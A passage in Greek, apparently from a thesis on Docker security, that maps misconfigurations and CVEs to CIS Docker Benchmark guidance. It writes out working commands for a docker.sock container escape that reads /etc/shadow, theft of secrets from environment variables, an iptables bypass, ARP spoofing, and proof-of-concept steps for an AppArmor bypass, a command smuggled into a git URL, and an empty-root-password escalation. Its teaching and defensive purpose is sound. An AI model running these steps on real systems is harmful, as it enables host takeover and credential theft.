να στείλουμε αιτήματα \textlatin{HTTP} στο \textlatin{socket} απευθείας. Αυτό
το βλέπουμε στην παρακάτω λίστα, η οποία εμφανίζει δύο εντολές
(για την εμφάνιση όλων των κοντέινερ) που παράγουν την ίδια έξοδο (αν και σε
διαφορετική μορφή). Η πρώτη εντολή χρησιμοποιεί τον \textlatin{Docker client}
και η δεύτερη εντολή στέλνει ένα αίτημα \textlatin{HTTP} απευθείας.

\texttt{\textlatin{(host)\$ docker ps -a}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(host)\$ curl --unix-socket /var/run/docker.sock -H 'ContentType: application/json' "http://localhost/containers/json?all=1"}}

\texttt{\textlatin{...}}

Το \textlatin{Docker Socket} καλύπτεται από τις κατευθυντήριες γραμμές 3.15 του
\textlatin{CIS Docker Benchmark}
(Βεβαιωθείτε ότι η ιδιοκτησία του αρχείου \textlatin{Docker Socket} έχει
οριστεί σε \texttt{\textlatin{root:docker}}) και 3.16 (Βεβαιωθείτε ότι τα
δικαιώματα αρχείου \textlatin{Docker Socket} έχουν οριστεί σε 660 ή περισσότερο
περιοριστικά).

Σε αυτή την ενότητα θα εξετάσουμε τους πολλούς τρόπους για να ρυθμίσει κανείς
εσφαλμένα το \textlatin{Docker Socket} και τους κινδύνους
\cite{The-Dangers-Of-Docker-Sock} που συνεπάγεται αυτό.

\subsubsection{Διαφυγές κοντέινερ μέσα από \textlatin{Docker Socket}}

Παροχή πρόσβασης κοντέινερ στο \textlatin{API} (προσαρτώντας τo
\textlatin{socket} ως \textlatin{volume}) είναι μια κοινή πρακτική, επειδή
επιτρέπει στα κοντέινερ να παρακολουθούν και να αναλύουν
άλλα κοντέινερ. Εάν το \texttt{\textlatin{/var/run/docker.sock}} έχε
προσαρτηθεί ως \textlatin{volume} σε ένα κοντέινερ, το κοντέινερ έχει πρόσβαση
στο \textlatin{API} (ακόμα κι αν είναι το \textlatin{socket} τοποθετημένο ως
\textlatin{volume} μόνο για ανάγνωση \cite{The-Dangers-Of-Docker-Sock}
\cite{Read-Only-Docker-Socket-Tweet} \cite{Read-Only-Docker-Socket-Hackernews}).
Αυτό σημαίνει ότι η διαδικασία μέσα στο κοντέινερ έχει πλήρη πρόσβαση στο
\textlatin{Docker} στον κεντρικό υπολογιστή. Αυτό μπορεί να χρησιμοποιηθεί για
να διαφύγει κανείς από το κοντέινερ, επειδή το κοντέινερ μπορεί να δημιουργήσει
ένα άλλο κοντέινερ με αυθαίρετα \textlatin{volumes} και εντολές. Είναι ακόμη
δυνατό να δημιουργηθεί ένα \textlatin{interactive shell} μέσα άλλα κοντέινερς
\cite{Escape-Socket-Shell}.

Ας υποθέσουμε ότι θέλουμε να βρούμε τον κατακερματισμό κωδικού πρόσβασης ενός
χρήστη που ονομάζεται διαχειριστής στον κεντρικό υπολογιστή. Μπορούμε να
εκτελέσουμε εντολές σε ένα κοντέινερ με
\texttt{\textlatin{/var/run/docker.sock}} προσαρτημένο ως \textlatin{volume}.
Χρησιμοποιούμε το \textlatin{API} για να ξεκινήσουμε ένα άλλο \textlatin{Docker}
κοντέινερ (στον κεντρικό υπολογιστή), που έχει πρόσβαση στον κατακερματισμό
κωδικό πρόσβασης (που βρίσκεται στο \texttt{\textlatin{/etc/shadow}}).
Διαβάζουμε το αρχείο κωδικών πρόσβασης, αναλύοντας τα αρχεία καταγραφής
(\textlatin{logs}) του κοντέινερ που έχουμε μόλις δημιουργήσει. \\

\texttt{\textlatin{(host)\$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash}}

\texttt{\textlatin{(cont)\# curl -XPOST -H "Content-Type: application/json" --unix -socket /var/run/docker.sock -d '\{"Image":"ubuntu:latest"," Cmd":["cat", "/host/etc/shadow"],"Mounts":[\{"Type":"bind"," Source":"/","Target":"/host"\}]\}' "http://localhost/containers/create?name=escape"}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(cont)\# curl -XPOST --unix-socket /var/run/docker.sock "http://localhost/containers/escape/start"}}

\texttt{\textlatin{(cont)\# curl --output - --unix-socket /var/run/docker.sock "http://localhost/containers/escape/logs?stdout=true"}}

\texttt{\textlatin{...}}

\texttt{\textlatin{admin:\$6\$VOSV5AVQ\$jHWxAVAUgl...:18142:0:99999:7:::}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(cont)\# curl -X DELETE --unix-socket /var/run/docker.sock "http://localhost/containers/escape"}} \\

Αυτό καλύπτεται από την κατευθυντήρια γραμμή 5.31 του
\textlatin{CIS Docker Benchmark} (Βεβαιωθείτε ότι το \textlatin{Docker socket}
δεν είναι τοποθετημένη μέσα σε κανένα κοντέινερ).

\subsubsection{Ευαίσθητες πληροφορίες}

Όταν ένα κοντέινερ έχει πρόσβαση στο \texttt{\textlatin{/var/run/docker.sock}}
(δηλαδή όταν \texttt{\textlatin{/var/run/docker.sock}} προστίθεται ως
\textlatin{volume} μέσα στο κοντέινερ), μπορεί όχι απλά να ξεκινήσει
νέα κοντέινερ αλλά μπορεί επίσης να διαβάσει το \textlatin{configuration} των
υπαρχόντων κοντέινερ. Το \textlatin{configuration} ενδέχεται να περιέχει
ευαίσθητες πληροφορίες (π.χ. κωδικούς πρόσβασης σε μεταβλητές περιβάλλοντος).

Ας ξεκινήσουμε μια βάση δεδομένων \textlatin{Postgres}
\footnote{\textlatin{https://www.postgresql.org/}} μέσω \textlatin{Docker}.
Από την τεκμηρίωση της εικόνας Postgres Docker
\footnote{\textlatin{https://hub.docker.com/\_/postgres}}, γνωρίζουμε ότι
μπορούμε να παρέχουμε έναν κωδικό πρόσβασης χρησιμοποιώντας τη μεταβλητή
περιβάλλοντος \textlatin{POSTGRES\_PASSWORD}. Αν έχουμε πρόσβαση σε
ένα άλλο κοντέινερ που έχει πρόσβαση στο \textlatin{Docker API}, μπορούμε να
διαβάσουμε τον κωδικό πρόσβασης από τη μεταβλητή περιβάλλοντος. \\

\texttt{\textlatin{(host)\$ docker run --name database -e POSTGRES\_PASSWORD=secret -d postgres}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(host)\$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock:ro ubuntu:latest bash}}

\texttt{\textlatin{(cont)\# apt update}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(cont)\# apt install curl jq}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(cont)\# curl --unix-socket /var/run/docker.sock -H 'ContentType: application/json' "http://localhost/containers/database/json" | jq -r '.Config.Env'}}

\texttt{\textlatin{[}}

\texttt{\textlatin{"POSTGRES\_PASSWORD=secret",}}

\texttt{\textlatin{...}}

\texttt{\textlatin{]}}\\

Αυτό καλύπτεται επίσης από την κατευθυντήρια γραμμή 5.31 του
\textlatin{CIS Docker Benchmark} (Βεβαιωθείτε ότι η το \textlatin{Docker socket}
δεν είναι τοποθετημένο μέσα σε κανένα κοντέινερ).

\subsubsection{Απομακρυνσμένη Πρόσβαση}

Είναι επίσης δυνατό να κάνουμε το \textlatin{Docker API} να ακούει σε μια θύρα
\textlatin{TCP}. Οι θύρες 2375 και 2376 χρησιμοποιούνται συνήθως για επικοινωνία
\textlatin{HTTP} και \textlatin{HTTPS} του \textlatin{Docker API}, αντίστοιχα.
Αυτό, ωστόσο, φέρνει όλη την επιπλέον πολυπλοκότητα που έχουν τα
\textlatin{TCP sockets}. Εάν δεν έχει ρυθμιστεί να "ακούει" μόνο σε
\textlatin{localhost}, τότε, αυτό δίνει σε κάθε κεντρικός υπολογιστή στο δίκτυο
πρόσβαση στο \textlatin{Docker}. Εάν ο κεντρικός υπολογιστής είναι άμεσα
προσβάσιμος μέσω του διαδικτύου, τότε, δίνει σε όλους πρόσβαση σε όλες τις
δυνατότητες του \textlatin{Docker} στον κεντρικό υπολογιστή. Ένας επιτιθέμενος
θα μπορούσε να εκμεταλλευτεί αυτήν την εσφαλμένη ρύθμιση ξεκινώντας άλλα
κοντέινερς που θα μπορούσαν να οδηγήσουν σε περαιτέρω πρόσβαση σε άλλα κοντέινερ
και των υποκείμενες υποδομών τους \cite{Metasploit-Unprotected-TCP-Socket}.

Ένας κακόβουλος χρήστης εκμεταλλέυτηκε αυτό το χαρακτηριστικό τον Μάιο του 2019.
Χρησιμοποίησε το \textlatin{Shodan}
\footnote{\textlatin{https://www.shodan.io/}} προκειμένου να βρεί μη
προστατευμένα δημόσια προσβάσιμα \textlatin{Docker APIs} και να ξεκινήσει
κοντέινερ με σκοπό εξόρυξη κρυπτονομισμάτων (\textlatin{Monero}
\footnote{\textlatin{https://www.getmonero.org/}}) και προκειμένου να βρεί
άλλους ξενιστές για να μολύνει \cite{zoolu2-bot-1807} \cite{zoolu2-bot-1809}
\cite{zoolu2-bot-1853}.

Καμία οδηγία \textlatin{CIS Docker Benchmark} δεν καλύπτει τη περίπτωση του
να είναι το \textlatin{Docker API} προσβάσιμο μέσω \textlatin{TCP}.

\subsection{Παράκαμψη \texttt{\textlatin{iptables}}}

Ο πυρήνας του \textlatin{Linux} έχει ένα ενσωματωμένο \textlatin{firewall}, που
ονομάζεται \textlatin{Netfilter} το οποίο μπορεί να ρυθμιστεί με ένα πρόγραμμα
που ονομάζεται \texttt{\textlatin{iptables}}. Αυτό το \textlatin{firewall}
αποτελείται από πολλές αλυσίδες κανόνων που αποθηκεύονται σε πίνακες. Κάθε
πίνακας έχει διαφορετικό σκοπό.
Για παράδειγμα, υπάρχει ένας πίνακας \textlatin{nat} για μετάφραση διευθύνσεων
και ένας πίνακας φίλτρων για φιλτράρισμα κίνησης (το οποίο είναι το
προεπιλεγμένο). Κάθε πίνακας έχει διατεταγμένες αλυσίδες (\textlatin{chains of
ordered rules})
κανόνων που έχουν επίσης διαφορετικό σκοπό. Για παράδειγμα, υπάρχουν τα
\textlatin{OUTPUT} και αλυσίδες \textlatin{INPUT} στον πίνακα φίλτρων που
προορίζονται για όλη την εξερχόμενη και
εισερχόμενη κίνηση, αντίστοιχα. Είναι δυνατό να διαμορφώουμε αυτούς τους κανόνες
χρησιμοποιώντας ένα πρόγραμμα που ονομάζεται \textlatin{iptables}. Όλα τα τείχη
προστασίας που βασίζονται στο \textlatin{Linux} (π.χ. \textlatin{ufw})
χρησιμοποιούν \textlatin{iptables} ως \textlatin{backend}.

Όταν ξεκινά ο \textlatin{Docker Daemon}, δημιουργεί τις δικές του αλυσίδες και
κανόνων για τη δημιουργία απομονωμένων δικτύων. Ο τρόπος που θέτει τους κανόνες
του παρακάμπτει εντελώς άλλους κανόνες στο τείχος προστασίας (επειδή έχουν
ρυθμιστεί πριν από τους άλλους κανόνες) και από προεπιλογή οι κανόνες είναι
αρκετά ανεκτικοί. Αυτό είναι \textlatin{by design}, επειδή το δικτυακό
\textlatin{stack} κεντρικού υπολογιστή και του κοντέινερ είναι ξεχωριστά,
συμπεριλαμβανομένων των κανόνων του τείχους προστασίας. Οι χρήστες του
\textlatin{Docker} μπορεί να έχουν την εντύπωση ότι οι κανόνες του τείχους
προστασίας που ορίζονται από το κεντρικό υπολογιστή ισχύουν για οτιδήποτε τρέχει
στον σε αυτόν (συμπεριλαμβανομένων των κοντέινερ). Αυτό δεν ισχύει για τα
\textlatin{Docker} κοντέινερ και θα μπορούσε να οδηγήσει σε εκτεθειμένες πόρτες
(\textlatin{ports}).

Είναι, ωστόσο, λίγο αντιφατικό, γιατί θα υποθέταμε ότι αν α
ένας κανόνας του τείχους προστασίας έχει οριστεί στον κεντρικό υπολογιστή, θα
ίσχυε για οτιδήποτε τρέχει σε αυτόν (συμπεριλαμβανομένων των κοντέινερ).

Θα εξετάσουμε το ακόλουθο παράδειγμα παράκαμψης ενός κανόνα τείχους προστασίας
με \textlatin{Docker}. \\

\texttt{\textlatin{(host)\# iptables -A OUTPUT -p tcp --dport 80 -j DROP}}

\texttt{\textlatin{(host)\# iptables -A FORWARD -p tcp --dport 80 -j DROP}}

\texttt{\textlatin{(host)\$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock:ro ubuntu:latest bash}}

\texttt{\textlatin{(host)\$ curl http://httpbin.org/get}}

\texttt{\textlatin{curl: (7) Failed to connect to httpbin.org port 80: Connection timed out}}

\texttt{\textlatin{(host)\$ docker run -it --rm ubuntu /bin/bash}}

\texttt{\textlatin{(cont)\# apt update}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(cont)\# apt install curl}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(cont)\# curl http://httpbin.org/get}}

\texttt{\textlatin{\{}}

\texttt{\textlatin{"args": \{\}}}

\texttt{\textlatin{"headers": \{}}

\texttt{\textlatin{"Accept": "*/*",}}

\texttt{\textlatin{"Host": "httpbin.org",}}

\texttt{\textlatin{"User-Agent": "curl/7.58.0"}}

\texttt{\textlatin{\},}}

\texttt{\textlatin{...}}

\texttt{\textlatin{"url": "https://httpbin.org/get"}}

\texttt{\textlatin{\}}} \\


Στην παραπάνω λίστα ρυθμίζουμε πρώτα κανόνες για να απορρίψουμε όλη την
εξερχόμενη (συμπεριλαμβανομένης της προωθούμενης) κίνησης στη θύρα 80 (την
τυπική θύρα \textlatin{HTTP}). Στη συνέχεια, προσπαθούμε να ζητήσουμε
μια ιστοσελίδα (\textlatin{http://httpbin.org/get}) στον κεντρικό υπολογιστή.
Όπως ήταν αναμενόμενο, η υπηρεσία \textlatin{HTTP} δεν είναι προσβάσιμη για
εμάς. Αν στη συνέχεια προσπαθήσουμε να κάνουμε το ίδιο ακριβώς αίτημα
σε ένα κοντέινερ, λειτουργεί.

Το \textlatin{CIS Docker Benchmark} δεν καλύπτει αυτό το πρόβλημα. Αυτό, ωστόσο,
έχει οδηγίες που διασφαλίζουν την ύπαρξη αυτού του προβλήματος. Κατευθυντήρια
γραμμή 2.3 (Βεβαιωθείτε ότι στο Docker επιτρέπεται να κάνει αλλαγές στα
\textlatin{iptables}) συνιστά ο \textlatin{Docker daemon} επιτρέπεται να αλλάξει
τους κανόνες του τείχους προστασίας. Κατευθυντήρια γραμμή 5.9 (Βεβαιωθείτε ότι
το \textlatin{namespace} του δικτύου του κεντρικού υπολογιστή δεν είναι
κοινόχρηστος) συνιστά τη μη χρήση του \texttt{\textlatin{--network=host}}
ορίσματος, για να βεβαιωθείτε ότι το κοντέινερ έχει τοποθετηθεί σε ξεχωριστή
στοίβα δικτύου.

Αυτές είναι καλές συστάσεις, γιατί ακολουθώντας τες δεν υπάρχει ανάγκη για να
να διαμορφώσουμε μόνοι μας μια στοίβα δικτύου με κοντέινερ. Ωστόσο, επιπλέον
απομονώνει τους κανόνες του τείχους προστασίας του κεντρικού υπολογιστή από τα
κοντέινερ.

\subsection{\textlatin{ARP Spoofing}}

Από προεπιλογή, όλα τα κοντέινερ \textlatin{Docker} προστίθενται στο ίδιο
γεφυρωμένο δίκτυο (\textlatin{bridged network}). Αυτό σημαίνει ότι μπορούν να
επικοινωνήσουν ο ένας με τον άλλον. Από προεπιλογή, τα κοντέινερ
\textlatin{Docker} λαμβάνουν επίσης την ικανότητα
\texttt{\textlatin{CAP\_NET\_RAW}}, η οποία τους επιτρέπει να δημιουργούν \textlatin{raw}
πακέτα. Αυτό σημαίνει ότι από προεπιλογή, τα κοντέινερ μπορούν να
κάνουν \textlatin{ARP Spoof} άλλα κοντέινερς \cite{Abusing-Containers}
\footnote{Η προώθηση \textlatin{IPv4} είναι ενεργοποιημένη από προεπιλογή στο \textlatin{Docker}}.

Ας ρίξουμε μια ματιά σε ένα πρακτικό παράδειγμα. Ας πούμε ότι έχουμε τρία
κοντέινερς. Ένα κοντέινερ θα κάνει \textlatin{ping} άλλο κοντέινερ. Ένα τρίτο
κακόβουλο κοντέινερ θέλει να υποκλέψει τα πακέτα \texttt{\textlatin{ICMP}}

Ξεκινάμε τρία κοντέινερ \textlatin{Docker} χρησιμοποιώντας την εικόνα
\textlatin{ubuntu:latest}. Εχουν τα ακόλουθα ονόματα, διευθύνσεις
\textlatin{IPv4} και διευθύνσεις \textlatin{MAC}: \\

\texttt{\textlatin{• victim0: 172.17.0.2}} και \texttt{\textlatin{02:42:ac:11:00:02}}

\texttt{\textlatin{• victim1: 172.17.0.3}} και \texttt{\textlatin{02:42:ac:11:00:03}}

\texttt{\textlatin{• attacker: 172.17.0.4}} και \texttt{\textlatin{02:42:ac:11:00:04}} \\

Συντομεύουμε τα ονόματά τους σε \textlatin{vic0, vic1, attck}, αντίστοιχα, αντί
για \textlatin{cont} για να υποδείξει σε ποιο κοντέινερ εκτελείται μια εντολή. \\

\texttt{\textlatin{(host)\$ docker run --rm -it --name=victim0 -h victim0 ubuntu:latest /bin/bash}}

\texttt{\textlatin{(vic0)\# apt update}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(vic0)\# apt install net-tools iproute2 iputils-ping}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(host)\$ docker run --rm -it --name=victim1 -h victim1 ubuntu:latest /bin/bash}}

\texttt{\textlatin{(host)\$ docker run --rm -it --name=attacker -h attacker ubuntu:latest /bin/bash}}

\texttt{\textlatin{(atck)\# apt update}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(atck)\# apt install dsniff net-tools iproute2 tcpdump}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(atck)\# arpspoof -i eth0 -t 172.17.0.2 172.17.0.3}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(vic0)\# arp}}

\texttt{\textlatin{arp}}

\texttt{\textlatin{172.17.0.3 ether 02:42:ac:11:00:04 C eth0}}

\texttt{\textlatin{...}}

\texttt{\textlatin{172.17.0.4 ether 02:42:ac:11:00:04 C eth0}}

\texttt{\textlatin{(vic0)\# ping 172.17.0.3}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(atck)\# tcpdump -vni eth0 icmp}}

\texttt{\textlatin{...}}

\texttt{\textlatin{10:16:18.368351 IP (tos 0x0, ttl 63, id 52174, offset 0, flags [DF], proto ICMP (1), length 84) 172.17.0.2 > 172.17.0.3: ICMP echo request, id 898, seq 5, length 64}}

\texttt{\textlatin{10:16:18.368415 IP (tos 0x0, ttl 64, id 8188, offset 0, flags [none], proto ICMP (1), length 84) 172.17.0.3 > 172.17.0.2: ICMP echo reply, id 898, seq 5, length 64}}

\texttt{\textlatin{...}} \\

Αρχικά ξεκινάμε τρία κοντέινερ και εγκαθιστούμε τις εξαρτήσεις. Μετά ξεκινάμε
να δηλητηριάζουμε τον πίνακα \textlatin{ARP} του \textlatin{victim0}. Μπορούμε
να το παρατηρήσουμε αυτό κοιτάζοντας τον πίνακα \textlatin{ARP} του
\textlatin{victim0} (με την εντολή \textlatin{arp}). Βλέπουμε ότι οι εγγραφές
για 172.17.0.3 και 172.17.0.4 είναι τα ίδια (\textlatin{02:42:ac:11:00:04}). Αν
εμείς στη συνέχεια αρχίσουμε να κάνουμε \textlatin{ping} από το
\textlatin{victim0} και κοιτάξουμε την κίνηση του \textlatin{ICMP} επιτιθέμενου,
βλέπουμε ότι τα πακέτα \textlatin{ICMP} δρομολογούνται μέσω του επιτιθέμενου.

Η απενεργοποίηση της επικοινωνίας μεταξύ κοντέινερ από προεπιλογή καλύπτεται στο
\textlatin{CIS Docker Benchmark} σύμφωνα με την οδηγία 2.1 (Βεβαιωθείτε ότι η
κυκλοφορία δικτύου είναι περιορισμένη μεταξύ κοντέινερ στην προεπιλεγμένη γέφυρα).

Είναι σημαντικό να σημειώσουμε ότι η πλαστογράφηση \textlatin{ARP} είναι
επεμβατική και μπορεί να είναι επηρεάσει τη σταθερότητα ενός δίκτυο με
κοντέινερ. Αυτό πρέπει να γίνεται μόνο κατά τη διάρκεια ενός
\textlatin{penetration testing} με τη ρητή άδεια του κατόχου ενός δικτύου.

\section{Σφάλματα Λογισμικού}

Σε αυτήν την ενότητα θα εξετάσουμε τα σφάλματα που σχετίζονται με την ασφάλεια
που έχουν εντοπιστεί τα τελευταία χρόνια. Αν και υπήρξαν πολλά σφάλματα που
σχετίζονται με την ασφάλεια στο οικοσύστημα \textlatin{Docker}, δεν έχουν όλα
μεγάλο αντίκτυπο ενώ κάποια 'αλλα δεν είναι πλήρως δημόσια. Θα δούμε πρόσφατα,
πλήρως δημοσοποιημένα σφάλματα που μπορεί να είναι χρήσιμα κατά τη διάρκεια μιας
δοκιμής διείσδυσης (με χρονολογική σειρά).

Τα σφάλματα που θα εξετάσουμε είναι χρήσιμα σε μια διαφυγή κοντέινερ (ενότητα 3.1).
Με εξαίρεση το \textlatin{CVE-2019-13139} (ενότητα 4.2.2) που μπορεί να είναι χρήσιμο
σε μια επίθεση \textlatin{Docker daemon} (ενότητα 3.2).

\subsection{\textlatin{CVE–2019–16884}}

Ένα σφάλμα στο \textlatin{runC (1.0.0-rc8} και παλαιότερες εκδόσεις) κατέστησε
δυνατή την προσάρτηση \texttt{\textlatin{/proc}} σε ένα κοντέινερ. Επειδή το
ενεργό προφίλ του \textlatin{AppArmor} ορίζεται στο
\texttt{\textlatin{/proc/self/attr/apparmor/current}}, αυτή η ευπάθεια επιτρέπει
ένα κοντέινερ να παρακάμψει πλήρως το \textlatin{AppArmor}.

Μια απόδειξη της ιδέας βλέπουμε στο \cite{CVE-2019-16884-Github}. Παρατηρούμε
ότι αν δημιουργήσουμε ένα \textlatin{mock} \texttt{\textlatin{/proc}}, το
\textlatin{Docker} ξεκινά χωρίς το καθορισμένο προφίλ \textlatin{AppArmor}.\\

\texttt{\textlatin{(host)\$ mkdir -p rootfs/proc/self/\{attr,fd\}}}

\texttt{\textlatin{(host)\$ touch rootfs/proc/self/\{status,attr/exec\}}}

\texttt{\textlatin{(host)\$ touch rootfs/proc/self/fd/\{4,5\}}}

\texttt{\textlatin{(host)\$ cat Dockerfile}}

\texttt{\textlatin{FROM busybox}}

\texttt{\textlatin{ADD rootfs /}}

\texttt{\textlatin{}}

\texttt{\textlatin{VOLUME /proc}}

\texttt{\textlatin{(host)\$ docker build -t apparmor-bypass .}}

\texttt{\textlatin{(host)\$ docker run --rm -it --security-opt "apparmor=dockerdefault" apparmor-bypass}}

\texttt{\textlatin{\# container runs unconfined}}

\subsection{\textlatin{CVE–2019–13139}}

Παλαιότερες εκδόσεις από το \textlatin{Docker} 18.09.4, είχαν ένα σφάλμα όταν το
\textlatin{docker} έκανε εσφαλμένα \textlatin{parse URLs}, κάτι που επέτρεπε την
εκτέλεση κώδικα \cite{CVE-2019-13139-STAALDRAAD}. Η συμοβολοσειρά η οποία
παρείχε στο \textlatin{docker build} χωρίζεται σε ":" και "\#" για να κάνει
\textlatin{parse} την αναφορά \textlatin{Git}. Παρέχοντας ένα κακόβουλο
\textlatin{URL}, μπορούμε να πετύχουμε εκτέλεση κώδικα.


Για παράδειγμα, στην ακόλουθη εντολή \textlatin{docker build}, η εντολή
Εκτελείται η «\textlatin{echo attack}». \\

\texttt{\textlatin{(host)\$ docker build "git@github.com/meh/meh\textbackslash \#--upload-pack=echo attack;\textbackslash \#:"}}

Το \texttt{\textlatin{docker build}} εκτελεί την εντολή \textlatin{git fetch}
στο παρασκήνιο. Αλλά με την κακόβουλη εντολή \texttt{\textlatin{git fetch
--upload-pack=echo attack; git@github.com/meh/meh}} εκτελείται και η 
\textlatin{echo attack}.

\subsection{\textlatin{CVE–2019–5736}}

Mια σοβαρή ευπάθεια ανακαλύφθηκε στο \textlatin{runC} που επιτρέπει στα
κοντέινερ να κάνουν \textlatin{overwrite} το \textlatin{runC binary} στον
κεντρικό υπολογιστή. Το \textlatin{Docker} πριν από την έκδοση 18.09.2 είναι
ευάλωτο. Κάθε φορά που δημιουργείται ένα κοντέινερ \textlatin{Docker} ή όταν το
\texttt{\textlatin{docker exec}} χρησιμοποιείται, εκτελείται μια διαδικασία
\textlatin{runC}. Αυτή η διαδικασία \textlatin{runC} εκκινεί το κοντέινερ.
Δημιουργεί όλους τους απαραίτητους περιορισμούς και στη συνέχεια εκτελεί τη
διαδικασία που πρέπει να τρέξει στο κοντέινερ. Έρευνες έδειξαν ότι είναι δυνατό
το runC να εκτελείται μόνο του στο κοντέινερ, λέγοντας στο κοντέινερ να
ξεκινήσει το \texttt{\textlatin{/proc/self/exe}} το οποίο κατά τη διάρκεια του
\textlatin{bootstrap} είναι συνδεδεμένο με το \textlatin{runC binary}
\cite{CVE-2019-5736-DragonSector} \cite{CVE-2019-5736-Github}. Το
\texttt{\textlatin{/proc/self/exe}} στο κοντέινερ θα δείχνει στο \textlatin{runC
binary} στον κεντρικό υπολογιστή. Ο χρήστης \texttt{\textlatin{root}} στο
κοντέινερ μπορεί στη συνέχεια να αντικαταστήσει το \textlatin{runC binary}
κεντρικό υπολογιστή χρησιμοποιώντας αυτήν την αναφορά. Την επόμενη φορά που θα
εκτελεστεί το \textlatin{runC} (δηλ. όταν δημιουργείται ένα κοντέινερ ή
εκτελείται το \texttt{\textlatin{docker exec}}), το αντικατασταθέν
\textlatin{runC binary} εκτελείται αντ' αυτού. Αυτό, φυσικά, είναι επικίνδυνο
γιατί επιτρέπει ένα κακόβουλο κοντέινερ να εκτελέσει κώδικα στον κεντρικό
υπολογιστή.

\subsection{\textlatin{CVE–2019–5021}}

Η εικόνα \textlatin{Docker} για το \textlatin{Alpine Linux} (μία από τις πιο
χρησιμοποιούμενες βασικές εικόνες) είχε
ένα πρόβλημα όπου ο κωδικός πρόσβασης του χρήστη \texttt{\textlatin{root}} στο
κοντέινερ παραμένει κενός.
Στο \textlatin{Linux} είναι δυνατό να απενεργοποιήσετε έναν κωδικό πρόσβασης και
να τον αφήσετε κενό. Ένας απενεργοποιημένος κωδικός πρόσβασης δεν μπορεί να
χρησιμοποιηθεί, αλλά ένας κενός κωδικός πρόσβασης ισούται με μια κενή
συμβολοσειρά. Αυτό επιτρέπει σε χρήστες που δεν είναι \texttt{\textlatin{root}}
να αποκτήσουν δικαιώματα \texttt{\textlatin{root}} παρέχοντας μια κενή
συμβολοσειρά.

Είναι ακόμα δυνατή η χρήση των ευάλωτων εικόνων (\textlatin{alpine:3.3,
alpine:3.4, alpine:3.5}. \\

\texttt{\textlatin{(host)\$ docker run -it --rm alpine:3.5 cat /etc/shadow}}

\texttt{\textlatin{root:::0:::::}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(host)\$ docker run -it --rm alpine:3.5 sh}}

\texttt{\textlatin{(cont)\# apk add --no-cache linux-pam shadow}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(cont)\# adduser test}}

\texttt{\textlatin{...}}

\texttt{\textlatin{(cont)\# su test}}

\texttt{\textlatin{Password:}}

\texttt{\textlatin{(cont)\$ su root}}

\texttt{\textlatin{(cont)\#}} \\

\textbf{Σημείωση σχετικά με τη βαθμολογία \textlatin{CVSS} του
\textlatin{CVE–2019–5021}} \\

Αυτή η ευπάθεια έχει βαθμολογία \textlatin{CVSS} 9,8 (και 10 σε
\textlatin{CVSS} 2)
\footnote{\textlatin{https://nvd.nist.gov/vuln/detail/CVE-2019-5021}} από
μέγιστη βαθμολογία 10. Μια τόσο υψηλή βαθμολογία \textlatin{CVSS} σημαίνει ότι
αυτό λαμβάνεται υπόψη ως μια ευπάθεια εξαιρετικά υψηλού κινδύνου. Αλλά στην
πραγματικότητα, αυτή η ευπάθεια είναι επικίνδυνη μόνο σε συγκεκριμένες
περιπτώσεις.

Ένας κενός κωδικός πρόσβασης \texttt{\textlatin{root}} ακούγεται επικίνδυνος,
αλλά στην πραγματικότητα δεν είναι τόσο επικίνδυνο σε ένα απομονωμένο περιβάλλον
(π.χ. ένα κοντέινερ) που λειτουργεί ως \texttt{\textlatin{root}} (μέσα στο
κοντέινερ) από προεπιλογή. Αυτή η ευπάθεια είναι μόνο επικίνδυνη σε
συγκεκριμένες περιπτώσεις.

Για παράδειγμα, αν δημιουργήσουμε μια εικόνα \textlatin{Docker} βασισμένη στο
\textlatin{alpine:3.5} που χρησιμοποιεί ένας χρήστης χωρίς
\texttt{\textlatin{root}} από προεπιλογή. Εάν ένας επιτιθέμενος βρει έναν τρόπο
να εκτελέσει κώδικα στο κοντέινερ, αυτή η ευπάθεια θα του επιτρέψει να
κλιμακώσει τα προνόμιά του από απλό χρήστη σε \texttt{\textlatin{root}}, αλλά
παρολαυτά ακόμα θα πρέπει ακόμα να βρει τρόπο να ξεφύγει από το κοντέινερ. Το να
είναι κάποιος ικανός να εκτελέσει κώδικα ως \texttt{\textlatin{root}} θα τον
βοηθήσει να ξεφύγει από το κοντέινερ, αλλά δεν το εγγυάται. Αυτό το παράδειγμα
δείχνει ότι αυτή η ευπάθεια είναι επικίνδυνη, αλλά μόνο σε ένα σενάριο όπου
είναι χρησιμοποιείται συναρτήσει άλλων ευπαθειών (\textlatin{chain
vulnerabilities}).

\subsection{\textlatin{CVE–2018–15664}}

Βρέθηκε ένα σφάλμα στο \textlatin{Docker 18.06.1-ce-rc1} που επιτρέπει
διεργασίες σε κοντέινερ να διαβάσουν και να γράψουν αρχεία στον κεντρικό
υπολογιστή \cite{CVE-2018-15664-Openwall} \cite{CVE-2018-15664-Bugzilla}.
Υπάρχει αρκετός χρόνος μεταξύ τον έλεγχο εάν ένας συμβολικός σύνδεσμος
(\textlatin{symlink}) είναι συνδεδεμένος με ένας ασφαλές \textlatin{path} (εντός
του κοντέινερ) και την πραγματική χρήση του συμβολικού συνδέσμου, ότι ο
συμβολικός σύνδεσμος μπορεί να "δείχνει" σε άλλο αρχείο. Αυτό επιτρέπει σε ένα
δοχείο να ξεκινά με ανάγνωση ή γραφή ένας συμβολικού συνδέσμου σε ένα αυθαίρετο
μη σχετικό αρχείο στο κοντέινερ, αλλά στην πραγματικότητα
να διαβάζει ή να γράφει ένα αρχείο στον κεντρικό υπολογιστή.

\subsection{\textlatin{CVE–2018–9862}}

Το \textlatin{Docker} προσπάθησε να ερμηνεύσει τις τιμές που δόθηκαν στο όρισμα
